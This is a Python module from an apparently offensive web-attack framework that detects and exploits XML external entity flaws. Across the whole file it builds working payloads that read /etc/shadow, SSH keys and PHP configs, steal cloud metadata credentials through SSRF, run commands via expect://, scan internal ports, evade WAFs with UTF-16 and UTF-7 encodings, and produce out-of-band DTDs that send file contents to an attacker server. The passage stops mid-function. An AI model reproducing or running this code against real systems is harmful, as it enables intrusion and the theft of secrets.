"""XXE injection detection and exploitation module."""

import re
import base64
import time
import hashlib
import threading
import statistics
from typing import Optional, Dict, List, Tuple, Any, Set
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.vuln_types import VT
import logging

logger = logging.getLogger(__name__)


# ENUMERATIONS

class XXETechnique(Enum):
    CLASSIC_INBAND   = "classic_inband"
    PHP_FILTER       = "php_filter"
    ERROR_BASED      = "error_based"
    BLIND_OOB_HTTP   = "blind_oob_http"
    LOCAL_DTD        = "local_dtd"
    PARAMETER_ENTITY = "parameter_entity"
    SOAP             = "soap_xxe"
    SVG              = "svg_xxe"
    SSRF             = "ssrf_xxe"
    BILLION_LAUGHS   = "billion_laughs_dos"
    UTF16_BYPASS     = "utf16_encoding_bypass"
    EXPECT_RCE       = "expect_rce"


class XXEContext(Enum):
    XML_BODY  = "xml_body"
    SOAP      = "soap"
    SVG       = "svg"
    MULTIPART = "multipart_upload"
    GENERIC   = "generic"


@dataclass
class XXEVulnerability:
    url: str
    technique: XXETechnique
    context: XXEContext
    payload: str
    confidence: float
    exploitable: bool
    exfiltrated_data: str = ""
    ssrf_target: str = ""
    metadata: Dict = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            "type": f"XXE ({self.technique.value})",
            "url": self.url,
            "technique": self.technique.value,
            "context": self.context.value,
            "payload": self.payload[:300],
            "confidence": self.confidence,
            "exploitable": self.exploitable,
            "exfiltrated_data_preview": self.exfiltrated_data[:500] if self.exfiltrated_data else "",
            "ssrf_target": self.ssrf_target,
            "metadata": self.metadata,
            "category": VT.XXE,
        }


# PAYLOAD BUILDER

class XXEPayloadBuilder:
    """
    Builds every known XXE payload variant — in-band, error-based, blind OOB,
    local DTD abuse, SSRF, SOAP, SVG, PHP filters, and encoding bypasses.
    """

    LINUX_FILES: List[str] = [
        "/etc/passwd",
        "/etc/hostname",
        "/etc/hosts",
        "/proc/version",
        "/proc/self/environ",
        "/etc/issue",
        "/proc/net/fib_trie",
        "/var/log/auth.log",
        "~/.ssh/id_rsa",
        "~/.bash_history",
        "/etc/shadow",
        "/etc/crontab",
        "/var/www/html/index.php",
    ]

    WINDOWS_FILES: List[str] = [
        "C:/Windows/win.ini",
        "C:/boot.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/inetpub/wwwroot/web.config",
        "C:/Windows/System32/inetsrv/MetaBase.xml",
        "C:/WINDOWS/php.ini",
        "C:/WINDOWS/my.ini",
        "C:/Users/Administrator/Desktop/secret.txt",
    ]

    PHP_TARGETS: List[str] = [
        "index.php",
        "config.php",
        "database.php",
        "db.php",
        "connect.php",
        "configuration.php",
        "settings.php",
        "../config.php",
        "../../config.php",
        "/var/www/html/index.php",
        "/var/www/html/config.php",
    ]

    SSRF_TARGETS: List[str] = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://localhost:8080/",
        "http://127.0.0.1:8080/",
        "http://localhost:6379/",
        "http://localhost:5432/",
        "http://localhost:27017/",
        "http://localhost:9200/",
        "http://127.0.0.1/server-status",
        "http://127.0.0.1/nginx_status",
        "http://localhost:8500/v1/kv/?keys",
        "http://localhost:2375/containers/json",
        "http://localhost:4567/",
        "http://localhost:3000/",
    ]

    LOCAL_DTDS: Dict[str, Tuple[str, str]] = {
        "docbookx_yelp": ("/usr/share/yelp/dtd/docbookx.dtd", "ISOamsa"),
        "docbookx_ubuntu": ("/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd", "ISOamsa"),
        "svg_w3c": ("/usr/share/xml/svg/w3c-svg-2.0/dtd/svg11-flat.dtd", "a.lat"),
        "xhtml1_strict": ("/usr/share/xml/xhtml1/dtd/xhtml1-strict.dtd", "a"),
        "html4": ("/usr/share/xml/schema/xml-core.rng", "a"),
    }

    def __init__(self, attacker_url: str = "http://interact.sh"):
        self.attacker = attacker_url.rstrip("/")


    def classic(self, file_path: str, root_tag: str = "root") -> str:
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY xxe SYSTEM "{file_path}">\n'
            f']>\n'
            f'<{root_tag}>&xxe;</{root_tag}>'
        )

    def classic_nested(self, file_path: str, outer: str, inner: str) -> str:
        """For APIs where the injectable element is a child tag, not root."""
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {outer} [\n'
            f'  <!ENTITY xxe SYSTEM "{file_path}">\n'
            f']>\n'
            f'<{outer}>\n'
            f'  <{inner}>&xxe;</{inner}>\n'
            f'</{outer}>'
        )

    def php_filter_b64(self, resource: str, root_tag: str = "root") -> str:
        uri = f"php://filter/convert.base64-encode/resource={resource}"
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY xxe SYSTEM "{uri}">\n'
            f']>\n'
            f'<{root_tag}>&xxe;</{root_tag}>'
        )

    def php_filter_chain(self, resource: str, root_tag: str = "root") -> str:
        """Chained filters: deflate → base64 (evades some filters)."""
        uri = f"php://filter/zlib.deflate/convert.base64-encode/resource={resource}"
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY xxe SYSTEM "{uri}">\n'
            f']>\n'
            f'<{root_tag}>&xxe;</{root_tag}>'
        )

    def expect_rce(self, command: str = "id", root_tag: str = "root") -> str:
        """PHP expect:// wrapper — RCE if expect extension is loaded."""
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY xxe SYSTEM "expect://{command}">\n'
            f']>\n'
            f'<{root_tag}>&xxe;</{root_tag}>'
        )


    def error_based(self, file_path: str, marker: str, root_tag: str = "root") -> str:
        """
        Trigger a parser error that leaks file content in the error message.
        Uses nested parameter entities: reads the file, then concatenates
        it into a nonexistent path that the parser tries to open.
        """
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY % file SYSTEM "{file_path}">\n'
            f'  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f"'file:///nonexist/{marker}/&#x25;file;'\">\n"
            f'  %eval;\n'
            f'  %error;\n'
            f']>\n'
            f'<{root_tag}>test</{root_tag}>'
        )

    def error_based_netdoc(self, file_path: str, root_tag: str = "root") -> str:
        """Alternate error-based using netdoc:// (Java parsers)."""
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY % file SYSTEM "{file_path}">\n'
            f'  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f"'netdoc:///nonexist/&#x25;file;'\">\n"
            f'  %eval;\n'
            f'  %error;\n'
            f']>\n'
            f'<{root_tag}>test</{root_tag}>'
        )


    def blind_oob_dtd_fetch(self, token: str, root_tag: str = "root") -> str:
        """HTTP callback: forces the parser to fetch a remote DTD."""
        dtd_url = f"{self.attacker}/xxe-{token}.dtd"
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY % remote SYSTEM "{dtd_url}">\n'
            f'  %remote;\n'
            f']>\n'
            f'<{root_tag}>test</{root_tag}>'
        )

    def blind_oob_direct(self, token: str, root_tag: str = "root") -> str:
        """Direct OOB via a plain external entity (no DTD needed)."""
        cb = f"{self.attacker}/xxe-direct?t={token}"
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY xxe SYSTEM "{cb}">\n'
            f']>\n'
            f'<{root_tag}>&xxe;</{root_tag}>'
        )

    def generate_exfil_dtd(self, file_path: str, token: str) -> str:
        """
        DTD content to host at {attacker}/xxe-{token}.dtd.
        When parsed, it reads file_path and sends the content to the
        attacker server embedded in a URL.
        """
        cb_base = f"{self.attacker}/xxe-data?t={token}&d="
        return (
            f'<!ENTITY % file SYSTEM "{file_path}">\n'
            f"<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM '{cb_base}&#x25;file;'>\">\n"
            f'%eval;\n'
            f'%exfil;'
        )

    # Local DTD repurposing

    def local_dtd_error(
        self, dtd_path: str, entity_name: str, file_path: str, root_tag: str = "root"
    ) -> str:
        """
        Repurpose a known local DTD to redefine a parameter entity.
        Works when external network access is blocked but local DTDs exist.
        Causes an error whose message contains the file content.
        """
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY % local SYSTEM "file://{dtd_path}">\n'
            f"  <!ENTITY % {entity_name} '<!ENTITY &#x25; file SYSTEM \"{file_path}\">\n"
            f"    <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM"
            f" &#x27;file:///nonexist/&#x25;file;&#x27;>\">\n"
            f"    &#x25;eval;\n"
            f"    &#x25;error;'>\n"
            f'  %local;\n'
            f'  %{entity_name};\n'
            f']>\n'
            f'<{root_tag}>test</{root_tag}>'
        )


    def ssrf(self, target_url: str, root_tag: str = "root") -> str:
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY ssrf SYSTEM "{target_url}">\n'
            f']>\n'
            f'<{root_tag}>&ssrf;</{root_tag}>'
        )

    def ssrf_port_scan(self, host: str, port: int, root_tag: str = "root") -> str:
        """Probe an internal host:port via SSRF-XXE (timing-based open/close detection)."""
        return self.ssrf(f"http://{host}:{port}/", root_tag)


    def soap_classic(self, file_path: str) -> str:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE soap:Envelope [\n'
            f'  <!ENTITY xxe SYSTEM "{file_path}">\n'
            ']>\n'
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
            '  <soap:Header/>\n'
            '  <soap:Body>\n'
            '    <erebus:request xmlns:erebus="http://example.com/service">&xxe;</erebus:request>\n'
            '  </soap:Body>\n'
            '</soap:Envelope>'
        )

    def soap_oob(self, token: str) -> str:
        dtd_url = f"{self.attacker}/soap-xxe-{token}.dtd"
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE soap:Envelope [\n'
            f'  <!ENTITY % remote SYSTEM "{dtd_url}">\n'
            '  %remote;\n'
            ']>\n'
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
            '  <soap:Body><test/></soap:Body>\n'
            '</soap:Envelope>'
        )


    def svg_classic(self, file_path: str) -> str:
        return (
            '<?xml version="1.0" standalone="yes"?>\n'
            '<!DOCTYPE svg [\n'
            f'  <!ENTITY xxe SYSTEM "{file_path}">\n'
            ']>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200">\n'
            '  <text x="10" y="50" font-size="14">&xxe;</text>\n'
            '</svg>'
        )

    def svg_oob(self, token: str) -> str:
        dtd_url = f"{self.attacker}/svg-xxe-{token}.dtd"
        return (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE svg [\n'
            f'  <!ENTITY % remote SYSTEM "{dtd_url}">\n'
            '  %remote;\n'
            ']>\n'
            '<svg xmlns="http://www.w3.org/2000/svg">\n'
            '  <text>test</text>\n'
            '</svg>'
        )


    def utf16_classic(self, file_path: str) -> bytes:
        """UTF-16 LE encoded XXE — evades WAFs that only inspect UTF-8."""
        xml = (
            f'<?xml version="1.0" encoding="UTF-16"?>\n'
            f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{file_path}">]>\n'
            f'<root>&xxe;</root>'
        )
        return xml.encode("utf-16")

    def utf7_classic(self, file_path: str) -> str:
        """UTF-7 encoded DOCTYPE for obscure parser bypass."""
        return (
            f'+ADw-?xml version=+ACI-1.0+ACI- ?+AD4-\n'
            f'+ADw-!DOCTYPE root [+ADw-!ENTITY xxe SYSTEM +ACI-{file_path}+ACI->]+AD4-\n'
            f'+ADw-root+AD4-+ACY-xxe+ADsAPA-/root+AD4-'
        )


    def billion_laughs(self, depth: int = 5, fanout: int = 5) -> str:
        """Confirms the attack surface by triggering exponential entity expansion."""
        entities = ['<!ENTITY lol "lol">']
        for i in range(2, depth + 1):
            prev_refs = "&lol;" * fanout if i == 2 else f"&lol{i-1};" * fanout
            entities.append(f'<!ENTITY lol{i} "{prev_refs}">')
        last = f"&lol{depth};"
        return (
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE lolz [\n'
            + "  " + "\n  ".join(entities) + "\n"
            + f']>\n<root>{last}</root>'
        )


    def benign(self, root_tag: str = "root") -> str:
        """Benign XML for baseline and parser detection."""
        return f'<?xml version="1.0" encoding="UTF-8"?>\n<{root_tag}>EREBUS_PROBE</{root_tag}>'

    def entity_probe(self, root_tag: str = "root") -> str:
        """Check if the parser resolves internal entities."""
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY probe "EREBUS_ENTITY_OK">\n'
            f']>\n'
            f'<{root_tag}>&probe;</{root_tag}>'
        )

    def xml_bomb_detect(self, root_tag: str = "root") -> str:
        """Minimal expansion probe — triggers if entity processing is depth-limited."""
        return (
            f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE {root_tag} [\n'
            f'  <!ENTITY a "AAAAAAAAAAA">\n'
            f'  <!ENTITY b "&a;&a;&a;&a;&a;">\n'
            f'  <!ENTITY c "&b;&b;&b;&b;&b;">\n'
            f']>\n'
            f'<{root_tag}>&c;</{root_tag}>'
        )


# RESPONSE ANALYZER

class XXEResponseAnalyzer:
    """
    Analyzes HTTP responses for evidence of XXE exploitation:
    file content disclosure, error path leaks, and SSRF indicators.
    """

    FILE_SIGNATURES: Dict[str, Tuple[List[str], float]] = {
        # (patterns, base_confidence)
        "linux_passwd":      ([r'root:x:0:0', r'daemon:.*:/usr/sbin', r'www-data:.*:/var/www', r'nologin'], 0.98),
        "linux_hostname":    ([r'^[\w\.-]{3,64}$'], 0.55),
        "linux_proc_ver":    ([r'Linux version \d+\.\d+', r'#\d+ SMP'], 0.97),
        "linux_hosts":       ([r'127\.0\.0\.1\s+localhost'], 0.80),
        "linux_environ":     ([r'PATH=.*:/usr', r'HOME=/(?:root|home|www)', r'SHELL='], 0.88),
        "linux_crontab":     ([r'SHELL=/bin', r'@reboot', r'\*/\d+\s+\*\s+\*\s+\*\s+\*'], 0.90),
        "linux_issue":       ([r'Ubuntu|Debian|CentOS|Fedora|Red Hat|Arch Linux'], 0.85),
        "windows_win_ini":   ([r'\[extensions\]', r'for 16-bit app support', r'\[mci extensions\]'], 0.97),
        "windows_hosts":     ([r'# Copyright \(c\) 1993', r'# localhost name resolution'], 0.92),
        "windows_boot_ini":  ([r'\[boot loader\]', r'multi\(0\)disk\(0\)', r'\[operating systems\]'], 0.97),
        "windows_web_cfg":   ([r'<configuration>', r'<connectionStrings>', r'<appSettings>'], 0.90),
        "ssh_key":           ([r'-----BEGIN (RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY-----'], 0.99),
        "aws_meta":          ([r'ami-\w+', r'instance-type', r'security-credentials', r'\"Code\":\s*\"Success\"'], 0.97),
        "gcp_meta":          ([r'"email":\s*"[^"]+iam\.gserviceaccount\.com"', r'computeMetadata'], 0.97),
        "azure_meta":        ([r'"subscriptionId"', r'"resourceGroupName"', r'compute.*azure'], 0.95),
        "php_source":        ([r'<\?php'], 0.95),
        "php_source_b64":    ([r'PD9waHA', r'PD9QSFAg'], 0.90),  # base64 of "<?ph", "<?PHP "
        "redis_banner":      ([r'\+OK', r'\$\d+\r\n', r'-ERR'], 0.92),
        "elasticsearch":     ([r'"cluster_name"', r'"number"\s*:', r'"tagline"\s*:.*You Know'], 0.93),
        "docker_api":        ([r'"Id"\s*:\s*"[0-9a-f]{64}"', r'"Names"\s*:', r'"Status"\s*:'], 0.95),
        "error_path_leak":   ([r'No such file.*nonexist.*EREBUS', r'failed to open stream.*nonexist'], 0.85),
        "generic_xxe_error": ([r'Failed to load external entity', r'External entity.*not.*allowed',
                               r'DOCTYPE is disallowed', r'external entity reference'], 0.40),
    }

    # Patterns that indicate the server rejected XXE with a WAF/security message
    WAF_BLOCK_PATTERNS = [
        r'XXE.*blocked', r'DOCTYPE.*not allowed', r'external.*entit.*forbidden',
        r'illegal.*DOCTYPE', r'xml.*injection', r'access.*denied.*DOCTYPE',
    ]

    @classmethod
    def analyze(cls, response_text: str) -> Tuple[bool, str, float]:
        """
        Check response for evidence of successful XXE.

        Returns:
            (found, evidence_type, confidence)
        """
        if not response_text:
            return False, "", 0.0

        best_confidence = 0.0
        best_evidence = ""

        for evidence_type, (patterns, base_conf) in cls.FILE_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE):
                    if base_conf > best_confidence:
                        best_confidence = base_conf
                        best_evidence = evidence_type
                    break

        return best_confidence > 0.0, best_evidence, best_confidence

    @classmethod
    def is_waf_blocked(cls, response_text: str) -> bool:
        for pattern in cls.WAF_BLOCK_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    @classmethod
    def extract_base64(cls, response_text: str) -> Optional[str]:
        """Extract and decode base64 blobs (PHP filter output)."""
        pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
        for match in re.finditer(pattern, response_text):
            try:
                raw = match.group(0)
                # Pad to multiple of 4
                padded = raw + "=" * (-len(raw) % 4)
                decoded = base64.b64decode(padded).decode("utf-8", errors="replace")
                # Check for recognizable content
                if any(sig in decoded for sig in [
                    "<?php", "root:x:", "Windows", "#!/", "import ", "class ", "[extensions]", "localhost"
                ]):
                    return decoded
            except Exception:
                continue
        return None

    @classmethod
    def is_entity_resolved(cls, response_text: str) -> bool:
        return "EREBUS_ENTITY_OK" in response_text

    @classmethod
    def analyze_ssrf_response(cls, response_text: str) -> Tuple[bool, str]:
        """Identify internal service content in an SSRF response."""
        service_patterns = {
            "aws_metadata":    [r'ami-id', r'instance-type', r'security-credentials'],
            "gcp_metadata":    [r'computeMetadata', r'gserviceaccount\.com'],
            "azure_metadata":  [r'"subscriptionId"', r'"resourceGroupName"'],
            "redis":           [r'\+OK', r'-ERR.*wrong number'],
            "elasticsearch":   [r'"cluster_name"', r'"version".*"number"'],
            "docker":          [r'"Id":', r'"Names":', r'"Status":'],
            "consul":          [r'"LockIndex"', r'"CreateIndex"'],
            "nginx_status":    [r'Active connections:', r'server accepts handled requests'],
            "apache_status":   [r'Apache Server Status', r'requests currently being processed'],
        }
        for service, patterns in service_patterns.items():
            for p in patterns:
                if re.search(p, response_text, re.IGNORECASE):
                    return True, service
        return False, ""

    @classmethod
    def compare_responses(cls, baseline_text: str, test_text: str) -> float:
        """
        Returns a divergence score: 0.0 = identical, 1.0 = completely different.
        Used to detect blind differences triggered by XXE.
        """
        if not baseline_text or not test_text:
            return 0.0
        diff = abs(len(test_text) - len(baseline_text))
        return min(1.0, diff / max(len(baseline_text), 1))


# OOB CONTROLLER

class OOBController:
    """
    Manages out-of-band interaction tokens for blind XXE confirmation.

    In a real engagement, integrate with Burp Collaborator or Interactsh.
    This class generates tokens, DTD content, and reports the infrastructure
    the operator must deploy on the attacker server.
    """

    def __init__(self, attacker_url: str):
        self.attacker_url = attacker_url.rstrip("/")
        self._tokens: Dict[str, Dict] = {}
        self._lock = threading.Lock()

    def new_token(self, label: str = "") -> str:
        token = hashlib.sha256(f"{time.time()}{label}".encode()).hexdigest()[:20]
        with self._lock:
            self._tokens[token] = {"created": time.time(), "label": label}
        return token

    def get_dtd_url(self, token: str) -> str:
        return f"{self.attacker_url}/xxe-{token}.dtd"

    def get_callback_url(self, token: str) -> str:
        return f"{self.attacker_url}/xxe-cb/{token}"

    def build_infrastructure(self, file_path: str, token: str) -> Dict[str, str]:
        """
        Returns a dict of {filename: content} to deploy on the attacker server
        for a full OOB data-exfiltration attack.
        """
        builder = XXEPayloadBuilder(self.attacker_url)
        dtd_name = f"xxe-{token}.dtd"
        dtd_content = builder.generate_exfil_dtd(file_path, token)
        instructions = (
            f"=== EREBUS OOB XXE Infrastructure (token: {token}) ===\n\n"
            f"1. Host '{dtd_name}' at: {self.attacker_url}/{dtd_name}\n"
            f"2. The payload triggers the target to fetch and parse that DTD.\n"
            f"3. The DTD reads '{file_path}' and sends its content to:\n"
            f"   {self.attacker_url}/xxe-data?t={token}&d=<FILE_CONTENT>\n\n"
            f"Monitor incoming HTTP requests to your server for the exfiltrated data.\n"
            f"Quick listener: python3 -m http.server 80\n"
        )
        return {
            dtd_name: dtd_content,
            "INSTRUCTIONS.txt": instructions,
        }


# MAIN XXE MODULE

class XXEModule:
    """
    Professional XXE detection and exploitation module.

    Combines in-band, error-based, blind OOB, SSRF, SOAP, SVG, and local DTD
    techniques into a single concurrent scan pipeline with false-positive
    reduction via baseline comparison and multi-pattern evidence matching.

    Usage:
        engine = HTTPEngine(...)
        xxe = XXEModule(engine, attacker_url="https://your.interact.sh")
        vulns = xxe.scan("https://target.com/api/xml")
        for v in vulns:
            print(v.to_dict())

        result = xxe.exploit(vulns[0], file_path="/etc/shadow")
        print(result["data"])

        infra = xxe.generate_oob_infrastructure("/etc/passwd")
        for fname, content in infra.items():
            print(f"--- {fname} ---\\n{content}\\n")
    """

    XML_CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/soap+xml",
        "application/xhtml+xml",
        "application/rss+xml",
        "application/atom+xml",
    ]

    SOAP_CONTENT_TYPES = [
        "application/soap+xml; charset=utf-8",
        "text/xml; charset=utf-8",
    ]

    def __init__(
        self,
        http_engine,
        attacker_url: str = "http://interact.sh",
        evasion_engine=None,
    ):
        self.http = http_engine
        self.evasion = evasion_engine
        self.attacker_url = attacker_url
        self.builder = XXEPayloadBuilder(attacker_url)
        self.oob = OOBController(attacker_url)
        self.analyzer = XXEResponseAnalyzer()


    def scan(
        self,
        url: str,
        test_oob: bool = True,
        test_ssrf: bool = True,
        test_soap: bool = True,
        test_local_dtd: bool = True,
        test_php_filter: bool = True,
        test_error_based: bool = True,
        fast_mode: bool = False,
        custom_content_type: Optional[str] = None,
    ) -> List[XXEVulnerability]:
        """
        Full XXE scan of the target endpoint.

        Args:
            url: XML-accepting endpoint.
            test_oob: Attempt blind OOB (requires attacker server reachable from target).
            test_ssrf: Probe internal services via SSRF-XXE.
            test_soap: Wrap payloads in a SOAP envelope.
            test_local_dtd: Try local DTD repurposing (no external connectivity needed).
            test_php_filter: Source code disclosure via PHP filter chains.
            test_error_based: Leak file content through parser error messages.
            fast_mode: Only run fastest in-band probes.
            custom_content_type: Override auto-detected content type.

        Returns:
            Deduplicated list of XXEVulnerability objects.
        """
        found: List[XXEVulnerability] = []
        seen: Set[str] = set()

        logger.info(f"[XXE] Scanning {url}")

        content_type = custom_content_type or self._detect_xml_content_type(url)
        logger.debug(f"[XXE] Using Content-Type: {content_type}")

        entities_resolved = self._check_entity_resolution(url, content_type)
        if entities_resolved:
            logger.info("[XXE] Internal entity resolution confirmed")

        baseline_text = self._get_baseline(url, content_type)

        jobs: List[Tuple[str, Any, Dict]] = [
            ("classic_linux", self._test_classic_linux, {"content_type": content_type}),
            ("classic_windows", self._test_classic_windows, {"content_type": content_type}),
        ]

        if test_error_based:
            jobs.append(("error_based", self._test_error_based, {"content_type": content_type}))

        if test_php_filter:
            jobs.append(("php_filter", self._test_php_filter, {"content_type": content_type}))

        if test_ssrf:
            jobs.append(("ssrf", self._test_ssrf, {"content_type": content_type, "baseline": baseline_text}))

        if test_oob:
            jobs.append(("blind_oob", self._test_blind_oob, {"content_type": content_type}))

        if test_soap:
            jobs.append(("soap", self._test_soap, {}))

        if not fast_mode:
            jobs.append(("billion_laughs", self._test_billion_laughs, {"content_type": content_type}))

        if test_local_dtd and not fast_mode:
            jobs.append(("local_dtd", self._test_local_dtd, {"content_type": content_type}))

        if not fast_mode:
            jobs.append(("expect_rce", self._test_expect_rce, {"content_type": content_type}))

        max_workers = min(len(jobs), 6)
        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = {
                pool.submit(fn, url, **kwargs): name
                for name, fn, kwargs in jobs
            }

            for future in as_completed(futures):
                job_name = futures[future]
                try:
                    results = future.result(timeout=90)
                    if not results:
                        continue
                    if isinstance(results, XXEVulnerability):
                        results = [results]
                    for v in results:
                        key = (v.technique.value, v.context.value)
                        if key not in seen:
                            seen.add(key)
                            found.append(v)
                            logger.info(
                                f"[XXE] ✓ {v.technique.value}  "
                                f"conf={v.confidence:.0%}  "
                                f"evidence={v.metadata.get('evidence_type', '?')}"
                            )
                except Exception as exc:
                    logger.debug(f"[XXE] {job_name} error: {exc}")

        return found

    def exploit(
        self,
        vulnerability: XXEVulnerability,
        file_path: str = "/etc/passwd",
        ssrf_target: str = "",
    ) -> Dict[str, Any]:
        """
        Exploit a confirmed XXE vulnerability to read files or pivot via SSRF.

        Returns:
            Dict with keys: success, data, technique, oob_infrastructure, instructions.
        """
        result: Dict[str, Any] = {
            "technique": vulnerability.technique.value,
            "success": False,
            "data": None,
            "oob_infrastructure": None,
            "instructions": None,
        }

        url = vulnerability.url
        ct = vulnerability.metadata.get("content_type", "application/xml")

        if vulnerability.technique == XXETechnique.CLASSIC_INBAND:
            data = self._read_file(url, file_path, ct)
            if data:
                result["success"] = True
                result["data"] = data

        elif vulnerability.technique == XXETechnique.PHP_FILTER:
            data = self._read_file_php(url, file_path, ct)
            if data:
                result["success"] = True
                result["data"] = data

        elif vulnerability.technique == XXETechnique.SSRF:
            target = ssrf_target or vulnerability.ssrf_target or self.builder.SSRF_TARGETS[0]
            data = self._fetch_ssrf(url, target, ct)
            if data:
                result["success"] = True
                result["data"] = data
                result["ssrf_target"] = target

        elif vulnerability.technique == XXETechnique.BLIND_OOB_HTTP:
            token = self.oob.new_token(file_path)
            infra = self.oob.build_infrastructure(file_path, token)
            result["success"] = True  # Infrastructure generated
            result["oob_infrastructure"] = infra
            result["payload"] = self.builder.blind_oob_dtd_fetch(token)
            result["instructions"] = infra.get("INSTRUCTIONS.txt", "")

        elif vulnerability.technique == XXETechnique.SOAP:
            data = self._read_file_soap(url, file_path)
            if data:
                result["success"] = True
                result["data"] = data

        elif vulnerability.technique == XXETechnique.ERROR_BASED:
            marker = self.oob.new_token()
            data = self._read_file_error(url, file_path, ct, marker)
            if data:
                result["success"] = True
                result["data"] = data

        return result

    def read_file(
        self,
        url: str,
        file_path: str,
        content_type: str = "application/xml",
    ) -> Optional[str]:
        """Convenience method: direct file read via the fastest available technique."""
        data = self._read_file(url, file_path, content_type)
        if not data:
            data = self._read_file_php(url, file_path, content_type)
        return data

    def generate_oob_infrastructure(self, file_path: str = "/etc/passwd") -> Dict[str, str]:
        """Generate a complete OOB exfiltration infrastructure package."""
        token = self.oob.new_token(file_path)
        return self.oob.build_infrastructure(file_path, token)

    def port_scan(
        self,
        url: str,
        host: str,
        ports: List[int],
        content_type: str = "application/xml",
        timeout_threshold: float = 1.5,
    ) -> Dict[int, str]:
        """
        Scan internal ports via SSRF-XXE using timing analysis.
        Open ports respond quickly (or with an error); closed ports time out.

        Returns:
            Dict of {port: "open"|"closed"|"filtered"}
        """
        results: Dict[int, str] = {}

        baseline_times = []
        for _ in range(3):
            start = time.time()
            self.http.post(url, data=self.builder.benign(), headers={"Content-Type": content_type})
            baseline_times.append(time.time() - start)
        baseline = statistics.mean(baseline_times) if baseline_times else 1.0

        for port in ports:
            payload = self.builder.ssrf_port_scan(host, port)
            start = time.time()
            resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
            elapsed = time.time() - start

            if not resp:
                results[port] = "filtered"
            elif elapsed < baseline + timeout_threshold:
                results[port] = "open"
            else:
                results[port] = "closed"

        return results


    def _detect_xml_content_type(self, url: str) -> str:
        """Detect which XML content type the endpoint accepts."""
        for ct in self.XML_CONTENT_TYPES:
            resp = self.http.post(
                url,
                data=self.builder.benign(),
                headers={"Content-Type": ct},
            )
            if resp and resp.status_code not in (404, 415, 501, 405):
                return ct
        return "application/xml"

    def _check_entity_resolution(self, url: str, content_type: str) -> bool:
        payload = self.builder.entity_probe()
        resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
        return bool(resp and self.analyzer.is_entity_resolved(resp.text))

    def _get_baseline(self, url: str, content_type: str) -> str:
        resp = self.http.post(url, data=self.builder.benign(), headers={"Content-Type": content_type})
        return resp.text if resp else ""


    def _test_classic_linux(
        self, url: str, content_type: str = "application/xml"
    ) -> List[XXEVulnerability]:
        return self._test_classic_files(url, self.builder.LINUX_FILES, content_type)

    def _test_classic_windows(
        self, url: str, content_type: str = "application/xml"
    ) -> List[XXEVulnerability]:
        return self._test_classic_files(url, self.builder.WINDOWS_FILES[:3], content_type)

    def _test_classic_files(
        self, url: str, files: List[str], content_type: str
    ) -> List[XXEVulnerability]:
        found = []
        for file_path in files:
            payload = self.builder.classic(file_path)
            resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
            if not resp:
                continue

            if self.analyzer.is_waf_blocked(resp.text):
                # Try nested payload variant
                payload = self.builder.classic_nested(file_path, "request", "data")
                resp = self.http.post(url, data=payload, headers={"Content-Type": content_type})
                if not resp:
                    continue

            detected, evidence_type, confidence = self.analyzer.analyze(resp.text)

            if not detected:
                # Check if PHP filter was unexpectedly triggered
                decoded = self.analyzer.extract_base64(resp.text)
                if decoded:
